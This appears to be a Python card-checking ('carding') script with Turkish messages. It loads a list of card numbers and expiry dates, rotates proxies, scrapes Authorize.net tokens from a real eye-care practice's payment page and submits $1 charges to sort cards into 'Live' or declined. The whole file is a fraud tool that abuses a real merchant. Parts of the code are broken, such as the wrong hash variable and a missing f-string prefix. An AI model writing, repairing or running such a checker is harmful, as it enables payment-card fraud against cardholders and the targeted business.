import requests as r
from bs4 import BeautifulSoup
import re
import random
import itertools
import time

def load_proxies(file_path='proxy.txt'):
    try:
        with open(file_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return itertools.cycle(proxies)
    except FileNotFoundError:
        return None
file = input('enter combo: ')
def load_cards(file_path=f'{file}'):
    try:
        with open(file_path, 'r') as f:
            cards = []
            for line in f:
                parts = line.strip().split('|')
                if len(parts) >= 3:
                    card_num = parts[0].strip()
                    exp_month_full = parts[1].strip().zfill(2)
                    exp_year_full = parts[2].strip()
                    exp_year_short = exp_year_full[-2:]
                    exp_date_authnet = exp_month_full + exp_year_short
                    cards.append({
                        'full_info': f"{card_num}|{exp_month_full}|{exp_year_full}",
                        'card_num': card_num,
                        'exp_date_authnet': exp_date_authnet
                    })
            return cards
    except FileNotFoundError:
        return []

proxy_generator = load_proxies()
cards_data = load_cards()

if not proxy_generator or not cards_data:
    if not proxy_generator:
        print("Proxy dosyası bulunamadı veya boş.")
    if not cards_data:
        print("Kart dosyası bulunamadı veya boş.")
    exit()

BASE_URL = 'https://hudsonrivereyecare.com'
AJAX_URL = f'{BASE_URL}/wp-admin/admin-ajax.php'
AUTH_NET_URL = 'https://secure.authorize.net/gateway/transact.dll'

HEADERS_AJAX = {
    'Accept': '*/*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Referer': f'{BASE_URL}/make-a-payment/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

HEADERS_POST = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

def process_card(card_info, current_proxy):
    
    card_num = card_info['card_num']
    exp_date_authnet = card_info['exp_date_authnet']
    full_info = card_info['full_info']
    
    formatted_proxy = ""
    try:
        parts = current_proxy.split(':')
        if len(parts) == 4:
            ip = parts[0]
            port = parts[1]
            user = parts[2]
            password = parts[3]
            formatted_proxy = f"{user}:{password}@{ip}:{port}"
        elif len(parts) == 2:
            formatted_proxy = current_proxy
        else:
            return f"{full_info} >> Proxy formatı desteklenmiyor."
            
        proxy_url_http = f"http://{formatted_proxy}"
        
        proxies = {
            'http': proxy_url_http,
            'https': proxy_url_http, 
        }
    except Exception as e:
        return f"{full_info} >> Proxy ayrıştırma hatası: {e}"

    s = r.session()
    
    try:
        PARAMS_AJAX = {
            'custom_amount': '1.00',
            'invoice_ajax': '',
            'rand': str(random.uniform(1.0, 3.0)), 
            'action': 'wp_tp_authorize_net_ajax',
        }
        
        x = s.get(
            AJAX_URL, 
            params=PARAMS_AJAX, 
            cookies=s.cookies, 
            headers=HEADERS_AJAX, 
            proxies=proxies,
            timeout=15
        )
        x.raise_for_status()
        
        login_match = re.search(r"name='x_login'\s+value='([^']*)'", x.text)
        hash_match = re.search(r"name='x_fp_hash'\s+value='([^']*)'", x.text)
        squance_match = re.search(r"name='x_fp_sequence'\s+value='([^']*)'", x.text)
        time_match = re.search(r"name='x_fp_timestamp'\s+value='([^']*)'", x.text)

        if not all([login_match, hash_match, squance_match, time_match]):
            return f"{full_info} >> Tokenlar bulunamadı"

        login = login_match.group(1)
        hash_val = hash_match.group(1)
        squance = squance_match.group(1)
        time_val = time_match.group(1)
        amount = PARAMS_AJAX['custom_amount']
        
        data = [
            ('x_show_form', 'pf_receipt'),
            ('x_show_form', 'pf_receipt'),
           ('x_login', f'{login}'),
           ('x_fp_hash', f'{hash}'),
           ('x_amount', '1'),
           ('x_fp_timestamp', '{time}'),
           ('x_fp_sequence', f'{squance}'),
            ('x_version', '3.1'),
            ('x_description', 'We are happy to provide convenient and secure online payments for our clients.'),
            ('x_test_request', 'false'),
            ('x_method', 'cc'),
            ('x_header_html_payment_form', '<h1>Tarrytown and White Plains offices</h1>'),
            ('x_logo_url', 'https://hudsonrivereyecare.com/wp-content/uploads/2017/04/optometrist-in-tarrytown-white-plains-ny-hudson-river.jpg'),
            ('x_receipt_link_method', 'https://hudsonrivereyecare.com/wp-content/uploads/2017/04/optometrist-in-tarrytown-white-plains-ny-hudson-river.jpg'),
            ('x_header_html_receipt', 'THANK YOU FOR MAKING A PAYMENT'),
            ('x_invoice_num', 'Invoice Number'),
            ('x_card_num', card_num),
            ('x_exp_date', exp_date_authnet),
            ('x_first_name', 'cash'),
            ('x_last_name', 'xpro'),
            ('x_company', 'Test Company'),
            ('x_address', '123 street St'),
            ('x_city', 'New York'),
            ('x_state', 'NY'),
            ('x_zip', '10001'),
            ('x_country', 'United States'),
            ('x_email', 'cashxpro@gmail.com'),
            ('x_phone', '5551234567'),
            ('x_fax', '5551234568'),
            ('x_ship_to_first_name', 'cash'),
            ('x_ship_to_last_name', 'xpro'),
            ('x_ship_to_company', 'Street Company'),
            ('x_ship_to_address', '123 street St'),
            ('x_ship_to_city', 'New York'),
            ('x_ship_to_state', 'NY'),
            ('x_ship_to_zip', '10001'),
            ('x_ship_to_country', 'United States'),
        ]

        res = s.post(
            AUTH_NET_URL, 
            headers=HEADERS_POST, 
            data=data, 
            proxies=proxies,
            timeout=15
        )
        res.raise_for_status()

        soup = BeautifulSoup(res.text, 'html.parser')
        error_h2 = soup.find('h2', {'role': 'alert'})
        
        if error_h2:
            error_message = error_h2.text.strip()
            return f"{full_info} >> {error_message}"
        else:
            return f"{full_info} >> Live"
            
    except s.exceptions.ProxyError as e:
        return f"{full_info} >> Proxy Hatası."
    except s.exceptions.RequestException as e:
        return f"{full_info} >> İstek Hatası."
    except Exception as e:
        return f"{full_info} >> Hata: {type(e).__name__}"
    finally:
        time.sleep(random.uniform(1, 3))

for card_info in cards_data:
    current_proxy = next(proxy_generator)
    result = process_card(card_info, current_proxy)
    print(result)